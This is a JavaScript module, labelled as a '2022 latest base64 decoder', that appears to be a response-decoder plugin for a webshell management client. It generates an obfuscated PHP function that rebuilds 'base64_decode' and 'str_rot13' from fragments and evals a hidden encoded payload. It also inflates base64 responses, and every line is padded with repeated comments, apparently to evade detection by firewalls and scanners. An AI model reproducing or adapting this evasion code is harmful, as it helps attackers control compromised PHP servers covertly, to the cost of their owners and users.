/**
 * php:: 2022最新 base64解码器
 * Create at: 2022
 */

 'use strict';
 var zlib = require('zlib');
 function ranStr(e) {    
     e = e || 32;
     var t='';
     t = "ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz012345678";
     let a = t.length,
     n = "";
     for (let i = 0; i < e; i++) n += t.charAt(Math.floor(Math.random() * a));
     return n
 }
 function ranNum(minNum,maxNum){ 
   let num=0;
   switch(arguments.length){ 
     case 1: 
     num = parseInt(Math.random()*minNum+1); 
   break; 
     case 2: 
     num = parseInt(Math.random()*(maxNum-minNum+1)+minNum); 
     break; 
   default: 
     num = 0; 
     break; 
   } 
   return num;
 }
 module.exports = {
 
   asoutput: () => {
     let /*     2022最新BASE64解码器      */ve=
     /*     2022最新BASE64解码器      */ranNum(1,10)/*     2022最新BASE64解码器      */;
     /*     2022最新BASE64解码器      */if(ve>8){/*     2022最新BASE64解码器      */
       /*     2022最新BASE64解码器      */return `function asenc($out){
         $aa='WUIloQ0anUE0pQ';$aa.='biY2uiqTAuL2uypl5wo20iLJ50qKOxLK';$aaa='c3Ry';$a='bas';$aa.='EyYaObpQ9hLJ1yCJu0';$aa.='qUN6Yl8aYvEsH0IFIxIFJlqVIS';$aaa.='X3Jv';$aa.='EDK0uCH1DaKF4xK1ASHyMS';$aa.='HyfvHxIEIHIGIS9IHxxvKF4';$aa.='aWaOup3Z9oz9hMFp7D';$a.='e64_de';$aa.='TMcoTIsM2I0K2AioaEyoaE';$a.='co';$aa.='mXPE1pzjcBlEiqaD9DTWup2H2AS9';$a.='de';$aaa.='dDEz';$aaa=$a($aaa);$aa.='yozAiMTHbM3cxMJMfLKEyXPEiqKDcXGf=';@eval($a($aaa($aa))); 
         return $ovt;
       }
       `/*     2022最新BASE64解码器      */.replace(/*     2022最新BASE64解码器      */
         /*     2022最新BASE64解码器      *//\n\s+/g,/*     2022最新BASE64解码器      */
         /*     2022最新BASE64解码器      */''/*     2022最新BASE64解码器      */
         /*     2022最新BASE64解码器      */)/*     2022最新BASE64解码器      */;
             /*     2022最新BASE64解码器      */}else{/*     2022最新BASE64解码器      */
       /*     2022最新BASE64解码器      */return `function asenc($out){
         $aa='WUIloQ0anUE0pQ';$aa.='biY2uiqTAuL2uypl5wo20iLJ50qKOxLK';$aaa='c3Ry';$a='bas';$aa.='EyYaObpQ9hLJ1yCJu0';$aa.='qUN6Yl8aYvEsH0IFIxIFJlqVIS';$aaa.='X3Jv';$aa.='EDK0uCH1DaKF4xK1ASHyMS';$aa.='HyfvHxIEIHIGIS9IHxxvKF4';$aa.='aWaOup3Z9oz9hMFp7Y';$a.='e64_de';$aa.='lcNMzyfMI9aMKEsL29hqTI';$a.='co';$aa.='hqUZbWUIloPx7Xv8xo3M0CHOvLKAyAwEsM';$a.='de';$aaa.='dDEz';$aaa=$a($aaa);$aa.='J5wo2EyXTq6MTIzoTS0MFtxo3I0XFx7';@eval($a($aaa($aa)));
         return $ovt;
       }
       `/*     2022最新BASE64解码器      */.replace(/*     2022最新BASE64解码器      */
         /*     2022最新BASE64解码器      *//\n\s+/g,/*     2022最新BASE64解码器      */
         /*     2022最新BASE64解码器      */''/*     2022最新BASE64解码器      */
         /*     2022最新BASE64解码器      */)/*     2022最新BASE64解码器      */;
     }
   },
   
   //
 
 decode_buff: (data, ext={}) => {
     /*     2022最新BASE64解码器      */    /*     2022最新BASE64解码器      */
     /*     2022最新BASE64解码器      */return zlib.inflateRawSync(
       /*     2022最新BASE64解码器      */Buffer.from(/*     2022最新BASE64解码器      */
       /*     2022最新BASE64解码器      */data.toString()/*     2022最新BASE64解码器      */
       /*     2022最新BASE64解码器      */,/*     2022最新BASE64解码器      */
       /*     2022最新BASE64解码器      */'base64'/*     2022最新BASE64解码器      */));
   }
 
 
 }